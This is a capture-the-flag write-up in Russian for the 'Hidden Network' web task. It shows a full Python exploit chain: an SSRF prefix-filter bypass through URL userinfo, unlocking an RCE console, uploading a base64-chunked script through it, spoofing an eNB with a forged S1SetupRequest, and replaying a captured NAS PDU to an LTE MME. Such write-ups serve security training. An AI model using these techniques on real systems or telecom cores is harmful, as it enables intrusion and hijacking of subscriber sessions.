---
title: "Hidden Network"
ctf: "Кубок CTF 2026"
team: "p3asants w/ sp3ars"
author: "citr0n"
date: 2026-10-31
category: web
difficulty: hard
points: 772
flag_format: "ctfcup{...}"
---

# Hidden Network

## Summary

Flask-приложение «управление фемтосотой» содержит SSRF-прокси с наивным
allowlist-фильтром `str.startswith("http://mme-monitor")`, который обходится через
userinfo в URL (`http://mme-monitor@<host>/`). Этот SSRF достаёт внутренний
агент, выпускающий одноразовый сервисный тикет, который открывает настоящий
RCE-шелл. Из этого шелла переходим во внутреннюю Docker-сеть, находим скрытый
LTE MME по сырому SCTP и, собрав поддельный `S1SetupRequest` (представляясь
настоящей eNB), а затем `InitialUEMessage`, повторяющий старый NAS PDU
перехваченного абонента, заставляем MME выдать флаг внутри сообщения
`DownlinkNASTransport`.

## Solution

### Шаг 1: обход SSRF-фильтра → сервисный тикет → RCE-консоль

`GET /api/diagnostics/connectivity-test?target=<url>` запрашивает `target` на
стороне сервера, но проверяет только `target.startswith("http://mme-monitor")`
перед вызовом `urllib.request.urlopen(target)`. Так как `urlopen` разбирает
`user@host` как userinfo, любая строка вида
`http://mme-monitor@<реальный-хост>:<порт>/<путь>` проходит проверку префикса,
а реальное TCP-соединение уходит на `<реальный-хост>`.

Применив этот обход к внутреннему `femto-agent` (обнаружен на `172.19.0.2:8081`),
получаем одноразовый сервисный тикет, привязанный к задаче поддержки. Отправка
этого тикета на `/maintenance` выставляет cookie-сессию `console_unlocked` и
открывает `/maintenance/console` — страницу, которая исполняет произвольные
shell-команды как намеренно уязвимая диагностическая функция
(`subprocess.run(["/bin/sh","-lc", command], timeout=4)`).

Из этого шелла (уже настоящий доступ к сети, а не ограниченный SSRF) чтение
`log_relay.py` раскрывает второй внутренний сервис (`mme-log-relay`), который
кеширует *последнюю* валидную строку лога "S1AP UL NAS trace" — включая сырой
hex NAS PDU старой Tracking Area Update (TAU) от настоящей сессии абонента. Этот
закешированный PDU — то самое "эхо старой сессии" из описания таска. Чтение
кеша также раскрывает идентичность легитимной eNB (имя `epc-lab-main`,
eNB-ID `0x44d`, PLMN `001/01`, TAC `7`) из строк лога S1 Setup.

### Шаг 2: найти скрытый MME и подделать eNB через S1AP/SCTP

Сам MME не резолвится по имени (`mme` намеренно отсутствует в DNS — тот самый
"голос владельца", замолчавший после неудачного обновления прошивки). Быстрое
сканирование SCTP-портов подсети `172.19.0.0/24` из RCE-шелла находит его на
порту `36412` (стандартный порт S1AP) по ранее неиспользуемому адресу в этой
подсети.

Используя `pysctp` + `pycrate` (обе библиотеки уже установлены в контейнере),
отправляем сконструированный `S1SetupRequest`, представляясь легитимной eNB —
MME принимает его и считает наше соединение настоящей базовой станцией. Затем
отправляем `InitialUEMessage`, повторяющий закешированный NAS PDU TAU (с
совпадающим `S-TMSI`/`m-TMSI`). MME обрабатывает его как легитимную
повторную аутентификацию этой старой сессии, и кастомная логика таска кладёт
флаг в поле `NAS-PDU` последующего сообщения `DownlinkNASTransport`.

```python
#!/usr/bin/env python3
"""Hidden Network (Кубок CTF 2026) — полное решение от URL инстанса до флага.

Этап A выполняется локально против публичного веб-приложения (SSRF -> тикет ->
разблокировка консоли). Этап B загружается и исполняется *внутри* контейнера
таска через разблокированную RCE-консоль, так как скрытый MME доступен
маршрутом только из внутренней Docker-сети (SCTP недоступен через
HTTP-only SSRF-прокси).
"""
import base64
import re
import textwrap
import requests

BASE = "http://<instance>.instances.ctfcup.online"   # из карточки таска
JOB_ID = 8427                                          # из GET /api/logs

s = requests.Session()

# --- Этап A: обход SSRF -> тикет -> разблокировка консоли ---------------------------
# Allowlist: target.startswith("http://mme-monitor"); urlopen() разбирает
# "user@host" как userinfo, поэтому *реальное* соединение идёт на то, что после '@'.
r = s.get(f"{BASE}/api/diagnostics/connectivity-test",
          params={"target": f"http://mme-monitor@172.19.0.2:8081/v1/jobs/{JOB_ID}"})
ticket = re.search(r'"maintenance_ticket":"([^"]+)"', r.json()["body"]).group(1)

r = s.post(f"{BASE}/maintenance", data={"ticket": ticket}, allow_redirects=False)
assert r.status_code == 302 and "session" in s.cookies, "тикет отклонён"

# --- Этап B: загрузка + запуск SCTP/S1AP-эксплойта через RCE-консоль ----------------
STAGE_B = textwrap.dedent("""
    import socket, sctp
    from pycrate_asn1dir import S1AP
    PDU = S1AP.S1AP_PDU_Descriptions.S1AP_PDU
    MME, PORT, PPID = "172.19.0.4", 36412, 18          # найден SCTP-сканом 172.19.0.0/24

    # S1SetupRequest, представляющийся настоящей eNB: имя "epc-lab-main", id 0x44d,
    # PLMN 001/01, TAC 7 (идентичность восстановлена из лога relay-сервиса).
    s1setup = bytes.fromhex(
        "00110031000004003b00080000f110000044d0003c400e05806570632d6c61"
        "622d6d61696e00400007000001c000f1100089400140")

    sk = sctp.sctpsocket_tcp(socket.AF_INET)
    sk.connect((MME, PORT))
    sk.sctp_send(s1setup, ppid=socket.htonl(PPID))
    sk.settimeout(5); sk.recv(8192)                     # S1SetupResponse (принят)

    # Повтор закешированного NAS PDU TAU для перехваченного абонента (m-TMSI 0x91a8504d),
    # взят из GET http://mme-log-relay:8082/v1/diagnostics/ran-support-cache.log
    nas_pdu = bytes.fromhex(
        "17044e2224020748030bf600f11000011a91a8504d5805f0f0c040091300f1"
        "100006c11002a840")
    ies = [
        {'id': 8,  'criticality': 'reject', 'value': ('ENB-UE-S1AP-ID', 20045)},
        {'id': 26, 'criticality': 'reject', 'value': ('NAS-PDU', nas_pdu)},
        {'id': 67, 'criticality': 'reject',
         'value': ('TAI', {'pLMNidentity': b'\\x00\\xf1\\x10', 'tAC': b'\\x00\\x07'})},
        {'id': 100, 'criticality': 'ignore',
         'value': ('EUTRAN-CGI', {'pLMNidentity': b'\\x00\\xf1\\x10', 'cell-ID': (0x44d01, 28)})},
        {'id': 134, 'criticality': 'ignore',
         'value': ('RRC-Establishment-Cause', 'mo-Signalling')},
        {'id': 96, 'criticality': 'reject',
         'value': ('S-TMSI', {'mMEC': b'\\x1a', 'm-TMSI': bytes.fromhex("91a8504d")})},
    ]
    PDU.set_val(('initiatingMessage', {
        'procedureCode': 12, 'criticality': 'ignore',
        'value': ('InitialUEMessage', {'protocolIEs': ies})}))
    sk.sctp_send(PDU.to_aper(), ppid=socket.htonl(PPID))

    sk.settimeout(3)
    for _ in range(5):
        data = sk.recv(8192)
        if b"ctfcup" in data:
            print(data[data.index(b"ctfcup"):].split(b"\\x00")[0].decode())
            break
    sk.close()
""")

b64 = base64.b64encode(STAGE_B.encode()).decode()
for i in range(0, len(b64), 400):                       # консоль ограничивает команды 512 символами
    s.post(f"{BASE}/maintenance/console", data={"command": f"printf '%s' '{b64[i:i+400]}' >> /tmp/s.b64"})
s.post(f"{BASE}/maintenance/console", data={"command": "base64 -d /tmp/s.b64 > /tmp/s.py"})

out = s.post(f"{BASE}/maintenance/console",
             data={"command": "nohup python3 /tmp/s.py > /tmp/s.log 2>&1 & sleep 3.5; cat /tmp/s.log"}).text
print(re.search(r"ctfcup\{[^}]+\}", out).group(0))
```

Ответ на финальный `InitialUEMessage` (`DownlinkNASTransport`, поле NAS-PDU):

```
000b403b0000030000000340015a00080003404e4d001a00262507fe6374666375707b7461755f7265706c61795f383266383137623132626263373730367d
decoded NAS-PDU: 07 fe 63 74 66 63 75 70 7b ... = 0x07 0xfe "ctfcup{tau_replay_82f817b12bbc7706}"
```

## Flag

```
ctfcup{tau_replay_82f817b12bbc7706}
```
